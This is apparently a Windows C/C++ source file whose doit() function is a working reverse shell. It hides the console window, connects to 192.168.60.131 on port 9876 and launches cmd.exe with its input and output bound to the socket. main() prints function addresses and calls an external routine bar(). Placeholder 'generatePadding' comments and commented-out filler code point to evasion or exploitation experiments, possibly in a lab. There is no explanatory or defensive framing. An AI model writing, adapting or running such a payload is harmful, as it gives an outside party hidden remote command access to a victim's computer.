 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <winsock2.h>  
 #include <stdio.h>  
 #include <stdint.h>
 #pragma comment(lib,"ws2_32")  

//generatePadding
//generatePadding

 WSADATA wsaData;  
 SOCKET sl;  
 struct sockaddr_in sockcon;  
 STARTUPINFO sui;  
 PROCESS_INFORMATION pi;  

 

 
extern "C" void foo();
extern "C" void bar();
void doit() ;
 int main(int argc, char* argv[])  
 {
     
     printf("bar  %08X:", &bar);
     printf("doit %08X:", &doit);
     getchar();
     bar();
     return -1;
 }
void doit() 
 { 
    //foo();	 
  ShowWindow (GetConsoleWindow(), SW_HIDE);  
  WSAStartup(MAKEWORD(2,2),&wsaData);  
  sl = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);  
  sockcon.sin_family = AF_INET;  
  sockcon.sin_port = htons(9876);
  sockcon.sin_addr.s_addr = inet_addr("192.168.60.131");  
  WSAConnect(sl, (SOCKADDR*)&sockcon,sizeof(sockcon),NULL,NULL,NULL,NULL);  

  memset(&sui, 0, sizeof(sui));  
  sui.cb = sizeof(sui);  
  sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);  
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) sl;  

  TCHAR commandLine[256] = "cmd.exe";  
  CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL,NULL, &sui, &pi);  
 }

// void foo()
// {
//     int x = 0xcafecafe;
//     uint8_t  array [1000];
//     memset(array, 0, 1000 );
//     for(int i = 0; i < 1000; i++)
//     {
//         array[i] = i; 
//     }
//     printf("%d", x);

// }
